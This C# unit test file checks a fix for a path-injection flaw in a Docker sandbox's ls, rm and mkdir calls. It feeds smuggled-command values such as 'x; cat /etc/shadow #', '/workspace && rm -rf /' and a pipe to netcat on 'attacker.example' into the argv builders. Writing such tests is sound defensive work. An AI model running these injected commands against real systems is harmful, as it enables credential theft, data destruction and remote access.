using HQ.Plugins.FileStorage;

namespace HQ.Plugins.Tests.FileStorage;

/// <summary>
/// WP6A-11 (blocking, adversarial re-review, 2026-09, cluster P7).
///
/// The prior pass of this cluster's WP6A-11 fix only truncated exec-command *logging* and left
/// the exact defect the finding cited untouched: <c>DockerSandbox.ListFilesAsync</c>,
/// <c>DeleteFileAsync</c> and the mkdir-p call inside <c>WriteFileAsync</c> built a
/// <c>/bin/bash -c "ls -la {path}"</c> / <c>"rm -rf {path}"</c> / <c>"mkdir -p {dir}"</c> string
/// from a caller-supplied path that FileStorageService only checks for non-emptiness (unlike
/// WorkspaceId, which is regex-validated). A path such as <c>"x; cat /etc/shadow #"</c> achieved
/// arbitrary command execution inside the sandbox container, defeating the ProtectedPaths check
/// rather than merely bypassing it.
///
/// The fix moves these three calls off <c>/bin/bash -c</c> entirely onto
/// <see cref="DockerSandbox.ExecArgvAsync"/> (argv passed directly to Docker's exec API, no
/// shell involved), mirroring <c>HQ.Plugins.ClaudeCode.ContainerManager.ExecArgvAsync</c>
/// (WP6A-3). These tests exercise the pure argv-builder functions the three call sites now use:
/// no matter what shell metacharacters a malicious path contains, it must arrive as a single,
/// unmodified argv element — never concatenated into a string a shell could reparse.
/// </summary>
public class DockerSandboxPathInjectionTests
{
    private const string InjectionAttempt = "x; cat /etc/shadow #";

    [Theory]
    [InlineData("x; cat /etc/shadow #")]
    [InlineData("/workspace && rm -rf /")]
    [InlineData("$(whoami)")]
    [InlineData("`id`")]
    [InlineData("/workspace/file|nc attacker.example 4444")]
    public void BuildLsArgv_KeepsPathAsASingleArgvElement_NeverConcatenatedIntoShellText(string maliciousPath)
    {
        var argv = DockerSandbox.BuildLsArgv(maliciousPath);

        Assert.Equal(new List<string> { "ls", "-la", maliciousPath }, argv);
        // No element embeds a shell invocation — the whole point is that Docker's exec API
        // receives argv directly (no /bin/bash -c wrapper), so nothing here needs interpreting.
        Assert.DoesNotContain(argv, a => a.Contains("bash"));
    }

    [Theory]
    [InlineData("x; cat /etc/shadow #", false)]
    [InlineData("x; cat /etc/shadow #", true)]
    public void BuildRmArgv_KeepsPathAsASingleArgvElement_NeverConcatenatedIntoShellText(string maliciousPath, bool recursive)
    {
        var argv = DockerSandbox.BuildRmArgv(maliciousPath, recursive);

        var expectedFlag = recursive ? "-rf" : "-f";
        Assert.Equal(new List<string> { "rm", expectedFlag, maliciousPath }, argv);
        Assert.DoesNotContain(argv, a => a.Contains("bash"));
    }

    [Fact]
    public void BuildMkdirPArgv_KeepsDirAsASingleArgvElement_NeverConcatenatedIntoShellText()
    {
        var argv = DockerSandbox.BuildMkdirPArgv(InjectionAttempt);

        Assert.Equal(new List<string> { "mkdir", "-p", InjectionAttempt }, argv);
        Assert.DoesNotContain(argv, a => a.Contains("bash"));
    }
}
